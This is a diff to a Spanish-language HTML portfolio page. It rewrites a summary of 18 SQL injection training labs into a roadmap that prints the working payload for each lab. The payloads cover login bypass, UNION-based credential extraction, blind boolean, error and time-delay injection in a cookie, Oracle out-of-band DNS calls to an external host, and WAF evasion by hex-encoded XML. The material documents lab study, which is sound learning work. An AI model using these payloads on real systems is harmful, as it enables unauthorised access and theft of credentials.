@@ -84,102 +84,210 @@
         </section>
 
         <section class="actividad-seccion">
-            <h2>Desarrollo Práctico: 18 Laboratorios de SQLi</h2>
-            <p style="margin-bottom: 20px; color: var(--muted-text);">
-                A continuación se detalla la progresión técnica de los laboratorios resueltos, abarcando desde la manipulación básica de consultas hasta la extracción de datos a ciegas (Blind SQLi).
-            </p>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Categoría de Ataque</th>
-                        <th>#</th>
-                        <th>Objetivo Técnico del Laboratorio</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td class="col-elemento" rowspan="2">SQLi Básica / Evasión</td>
-                        <td>Lab 01</td>
-                        <td>Recuperación de datos ocultos alterando la lógica de la cláusula <code>WHERE</code>.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 02</td>
-                        <td>Evasión del panel de autenticación (Login Bypass) inyectando sentencias siempre verdaderas (ej. <code>' OR 1=1--</code>).</td>
-                    </tr>
+            <h2>Road To The Hall Of Fame: 18 Laboratorios</h2>
+            <p>Ruta de progresión técnica documentando la resolución de inyecciones SQL, desde manipulación lógica hasta exfiltración a ciegas.</p>
 
-                    <tr>
-                        <td class="col-elemento" rowspan="4">Ataques UNION</td>
-                        <td>Lab 03</td>
-                        <td>Determinación del número exacto de columnas devueltas por la consulta original.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 04</td>
-                        <td>Identificación de columnas compatibles con tipos de datos de texto para inyectar <em>payloads</em>.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 05</td>
-                        <td>Extracción de credenciales (usuarios y contraseñas) consultando tablas externas de la base de datos.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 06</td>
-                        <td>Recuperación de múltiples valores concatenados en una sola columna para optimizar la extracción.</td>
-                    </tr>
+            <div class="roadmap-container">
 
-                    <tr>
-                        <td class="col-elemento" rowspan="4">Enumeración de Base de Datos</td>
-                        <td>Lab 07</td>
-                        <td>Consulta de la versión y el tipo de base de datos en entornos <strong>Oracle</strong>.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 08</td>
-                        <td>Consulta de la versión y el tipo de base de datos en entornos <strong>MySQL y Microsoft SQL Server</strong>.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 09</td>
-                        <td>Listado de esquemas, tablas y columnas (Information Schema) en bases de datos no Oracle.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 10</td>
-                        <td>Listado de esquemas, tablas y columnas utilizando diccionarios y vistas nativas de Oracle.</td>
-                    </tr>
+                <div class="roadmap-item roadmap-left">
+                    <div class="roadmap-content">
+                        <h3>Lab 01: SQLi in WHERE clause allowing retrieval of hidden data</h3>
+                        <p>Se inyectó una condición lógica booleana siempre verdadera en el parámetro de categoría para forzar a la base de datos a devolver todos los registros, evadiendo el filtro de productos "no publicados".</p>
+                        <div class="evidencia-tecnica">
+                            // Inyección para anular la validación (released=1) <br>
+                            GET /filter?category=Gifts' OR 1=1-- HTTP/2
+                        </div>
+                    </div>
+                </div>
 
-                    <tr>
-                        <td class="col-elemento" rowspan="4">Blind SQLi (Condicionales y Errores)</td>
-                        <td>Lab 11</td>
-                        <td>Inyección ciega con respuestas condicionales (Boolean-based), infiriendo datos a partir de cambios en la interfaz web.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 12</td>
-                        <td>Inyección ciega basada en errores condicionales (Error-based), provocando fallos matemáticos intencionales.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 13</td>
-                        <td>Extracción de información estructurada visible a través de los mensajes de error detallados del servidor.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 14</td>
-                        <td>Evasión de filtros y extracción de datos explotando vulnerabilidades en el procesamiento de XML.</td>
-                    </tr>
+                <div class="roadmap-item roadmap-right">
+                    <div class="roadmap-content">
+                        <h3>Lab 02: SQLi vulnerability allowing login bypass</h3>
+                        <p>Manipulación del panel de autenticación cerrando la cadena de texto del usuario e insertando un comentario SQL. Esto provoca que el motor ignore la validación de la contraseña.</p>
+                        <div class="evidencia-tecnica">
+                            // Payload inyectado en el campo "username"<br>
+                            administrator'--
+                        </div>
+                    </div>
+                </div>
 
-                    <tr>
-                        <td class="col-elemento" rowspan="4">Blind SQLi Avanzada (Tiempos y Out-of-Band)</td>
-                        <td>Lab 15</td>
-                        <td>Inyección ciega provocando retrasos de tiempo (Time delays) con funciones como <code>pg_sleep()</code>.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 16</td>
-                        <td>Extracción de contraseñas carácter por carácter midiendo milimétricamente el tiempo de respuesta del servidor.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 17</td>
-                        <td>Inyección ciega con interacción fuera de banda (OAST / Out-of-Band), provocando consultas DNS externas.</td>
-                    </tr>
-                    <tr>
-                        <td>Lab 18</td>
-                        <td>Exfiltración silenciosa de datos sensibles a través de canales Out-of-Band (DNS).</td>
-                    </tr>
-                </tbody>
-            </table>
+                <div class="roadmap-item roadmap-left">
+                    <div class="roadmap-content">
+                        <h3>Lab 03: Querying the database type and version on Oracle</h3>
+                        <p>Ataque basado en UNION para extraer metadatos. Al estar en Oracle, fue obligatorio utilizar la tabla integrada "DUAL" y consultar la vista v$version.</p>
+                        <div class="evidencia-tecnica">
+                            // Uso de UNION SELECT compensando 2 columnas en Oracle<br>
+                            GET /filter?category=Tech+gifts' UNION SELECT banner, NULL FROM v$version-- HTTP/2
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-right">
+                    <div class="roadmap-content">
+                        <h3>Lab 04: Querying database type and version on MySQL/Microsoft</h3>
+                        <p>Se utilizó el operador UNION y la constante global @@version. Fue necesario utilizar el carácter "#" (codificado) para comentar el resto de la consulta en entornos MySQL.</p>
+                        <div class="evidencia-tecnica">
+                            // Inyección de la constante global y cierre con #<br>
+                            GET /filter?category=Food+%26+Drink' UNION SELECT @@version, NULL# HTTP/2
+                        </div>
+                    </div>
+                </div>
+                <div class="roadmap-item roadmap-left">
+                    <div class="roadmap-content">
+                        <h3>Lab 05: SQL injection attack, listing the database contents on non-Oracle databases</h3>
+                        <p>Se usó UNION SELECT sobre information_schema.tables e information_schema.columns para enumerar tablas y columnas, descubriendo la tabla de usuarios y las credenciales en PostgreSQL.</p>
+                        <div class="evidencia-tecnica">
+                            // Extracción directa de las columnas identificadas<br>
+                            GET /filter?category=Gifts'+UNION+SELECT+username_ciefvi,+password_lexyyy+FROM+users_rwhvik-- HTTP/2
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-right">
+                    <div class="roadmap-content">
+                        <h3>Lab 06: SQL injection attack, listing the database contents on Oracle</h3>
+                        <p>Se extrajo información del diccionario de datos de Oracle utilizando las vistas all_tables y all_tab_columns para encontrar las credenciales del usuario administrador.</p>
+                        <div class="evidencia-tecnica">
+                            // Uso de UNION SELECT sobre las tablas específicas de Oracle<br>
+                            ' UNION SELECT USERNAME_UZFEPC, PASSWORD_FFQTUA FROM USERS_SQZOJL--
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-left">
+                    <div class="roadmap-content">
+                        <h3>Lab 07: SQL injection UNION attack, determining the number of columns returned by the query</h3>
+                        <p>Se determinó el número de columnas devueltas por la consulta original usando la técnica ORDER BY iterativa hasta provocar un error en el servidor, confirmándolo luego con valores NULL.</p>
+                        <div class="evidencia-tecnica">
+                            // Confirmación de las 3 columnas sin romper la sintaxis de tipos<br>
+                            GET /filter?category=Pets'+UNION+select+NULL,+NULL,+NULL-- HTTP/2
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-right">
+                    <div class="roadmap-content">
+                        <h3>Lab 08: SQL injection UNION attack, finding a column containing text</h3>
+                        <p>Sabiendo que la tabla tiene 3 columnas, se inyectó un valor de texto en diferentes posiciones hasta identificar cuál columna reflejaba el string indicado por el laboratorio.</p>
+                        <div class="evidencia-tecnica">
+                            // Inyección de un string literal en la columna compatible<br>
+                            GET /filter?category=Pets'+UNION+select+NULL,+'VIRVLU',+NULL-- HTTP/2
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-left">
+                    <div class="roadmap-content">
+                        <h3>Lab 09: SQL injection UNION attack, retrieving data from other tables</h3>
+                        <p>Se combinaron los resultados de la consulta original con los de la tabla 'users' mediante un ataque UNION, extrayendo usuarios y contraseñas de forma directa en pantalla.</p>
+                        <div class="evidencia-tecnica">
+                            // Recuperación de credenciales a la vista web<br>
+                            '+UNION+SELECT+username,+password+FROM+users--
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-right">
+                    <div class="roadmap-content">
+                        <h3>Lab 10: SQL injection UNION attack, retrieving multiple values in a single column</h3>
+                        <p>La aplicación solo reflejaba una columna de texto útil. Se utilizó la concatenación (||) para unir el usuario y la contraseña separados por un carácter especial '~' en un solo campo.</p>
+                        <div class="evidencia-tecnica">
+                            // Extracción concatenada de dos columnas hacia un solo campo<br>
+                            '+UNION+SELECT+NULL,+username||'~'||password+FROM+users--
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-left">
+                    <div class="roadmap-content">
+                        <h3>Lab 11: Blind SQL injection with conditional responses</h3>
+                        <p>Inyección ciega en la cookie TrackingId. Se utilizó lógica booleana y la función SUBSTRING junto con el Intruder de Burp Suite para extraer la contraseña del administrador comprobando el mensaje "Welcome back".</p>
+                        <div class="evidencia-tecnica">
+                            // Payload iterado por Burp Intruder en el parámetro §a§<br>
+                            TrackingId=xyz' AND (SELECT SUBSTRING(password, 1,1) FROM users WHERE username='administrator')='§a§
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-right">
+                    <div class="roadmap-content">
+                        <h3>Lab 12: Blind SQL injection with conditional errors</h3>
+                        <p>Al no haber diferencias visuales en la página, se forzó un error condicional (división por cero) mediante CASE WHEN para inferir la longitud y extraer la contraseña si la aplicación fallaba (HTTP 500).</p>
+                        <div class="evidencia-tecnica">
+                            // Oráculo basado en error de división por cero<br>
+                            TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password, 1, 1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-left">
+                    <div class="roadmap-content">
+                        <h3>Lab 13: Visible error-based SQL injection</h3>
+                        <p>Se explotó una vulnerabilidad que reflejaba errores detallados de la base de datos en la pantalla. Usando CAST() se provocó un error de tipo para que la contraseña se imprimiera en el propio mensaje de error.</p>
+                        <div class="evidencia-tecnica">
+                            // El error revelaba "invalid input syntax for type integer: [PASSWORD]"<br>
+                            TrackingId=xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-right">
+                    <div class="roadmap-content">
+                        <h3>Lab 14: Blind SQL injection with time delays</h3>
+                        <p>Se demostró la ejecución de código en segundo plano inyectando una instrucción que pausaba la respuesta de la base de datos durante 10 segundos, confirmando vulnerabilidad Blind basada en tiempo.</p>
+                        <div class="evidencia-tecnica">
+                            // Concatenación de función de retardo<br>
+                            TrackingId=x'||pg_sleep(10)--
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-left">
+                    <div class="roadmap-content">
+                        <h3>Lab 15: Blind SQL injection with time delays and information retrieval</h3>
+                        <p>Combinación del retraso condicional con funciones de longitud para extraer la contraseña letra por letra evaluando si el servidor se demoraba 10 segundos en responder ante una afirmación verdadera.</p>
+                        <div class="evidencia-tecnica">
+                            // Inyección de retraso condicionado en la cookie<br>
+                            TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-right">
+                    <div class="roadmap-content">
+                        <h3>Lab 16: Blind SQL injection with out-of-band interaction</h3>
+                        <p>Técnica Out-of-Band (OAST). La vulnerabilidad obligaba a la base de datos a realizar una consulta DNS externa de forma asíncrona hacia un subdominio generado para confirmar la inyección ciega.</p>
+                        <div class="evidencia-tecnica">
+                            // Forzado de interacción de red desde la base de datos hacia el atacante<br>
+                            TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;?xml+version="1.0"+encoding="UTF-8"?&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http://[DOMINIO-EXTERNO]/"&gt;+%25remote;]&gt;'),'/l')+FROM+dual--
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-left">
+                    <div class="roadmap-content">
+                        <h3>Lab 17: Blind SQL injection with out-of-band data exfiltration</h3>
+                        <p>Exfiltración de datos mediante OAST. La contraseña extraída mediante subconsultas SQL se incrustó dinámicamente como un subdominio en la resolución DNS para ser leída por el servidor del atacante.</p>
+                        <div class="evidencia-tecnica">
+                            // La contraseña viaja como subdominio hacia el exterior<br>
+                            Se forzó una petición DNS anidando el query de la contraseña dentro de la URL del Collaborator.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="roadmap-item roadmap-right">
+                    <div class="roadmap-content">
+                        <h3>Lab 18: SQL injection with filter bypass via XML encoding</h3>
+                        <p>La vulnerabilidad residía en el parámetro storeId enviado en XML. Para evadir el WAF que bloqueaba la consulta UNION, el payload fue ofuscado usando entidades hexadecimales con Hackvertor.</p>
+                        <div class="evidencia-tecnica">
+                            // Payload codificado en entidades XML para ofuscar el ataque<br>
+                            &lt;storeId&gt;&amp;#x31;&amp;#x20;&amp;#x55;&amp;#x4e;&amp;#x49;&amp;#x4f;&amp;#x4e;&amp;#x20;&amp;#x53;&amp;#x45;&amp;#x4c;&amp;#x45;&amp;#x43;&amp;#x54;&amp;#x20;&amp;#x75;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x7c;&amp;#x7c;&amp;#x27;&amp;#x7e;&amp;#x27;&amp;#x7c;&amp;#x7c;&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x77;&amp;#x6f;&amp;#x72;&amp;#x64;&amp;#x20;&amp;#x46;&amp;#x52;&amp;#x4f;&amp;#x4d;&amp;#x20;&amp;#x75;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x73;&lt;/storeId&gt;
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+                
         </section>
         <section class="actividad-seccion">
             <h2>Reflexión técnica</h2>
@@ -217,6 +325,7 @@
 
 </body>
 </html>
+
 
 
 
